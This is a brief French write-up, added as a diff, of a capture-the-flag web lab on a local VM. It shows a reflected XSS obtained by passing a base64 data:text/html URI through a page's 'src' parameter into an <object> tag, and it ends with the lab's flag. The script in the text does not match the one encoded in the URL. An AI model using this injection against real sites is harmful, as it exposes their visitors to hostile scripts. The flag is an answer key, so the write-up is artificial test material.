@@ -1,0 +1,16 @@
+sur la page index en cliauqnt sur la photo du logo de la nsa on arrive sur cette page http://192.168.56.105/?page=media&src=nsa
+
+on remarque une variable GET 'src' 
+
+je remarque une balise <object> dans le code, je remarque egalement que je suis cqpqble de faire loader nimporte quoi ce <object>
+
+ex : 	http://192.168.56.105/?page=media&src=../ affiche la page index
+		http://192.168.56.105/?page=media&src=//cdn.intra.42.fr/users/medium_ambelghi.jpg affiche ma photo de profile
+
+a force dessayer et de ne pas reussir a trouver le flag avec des urls je tente dinjecter une image en base64 -> ca marche mais pas de flag du coup je tente dinjecter le code suivant en js/html en convertissant en base64 :
+
+<script>alert('hello');</script>
+
+http://192.168.56.105/?page=media&src=data:text/html;base64,%20PHNjcmlwdD5hbGVydCh6ZWJpKTs8L3NjcmlwdD4=
+
+THE FLAG IS : 928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D
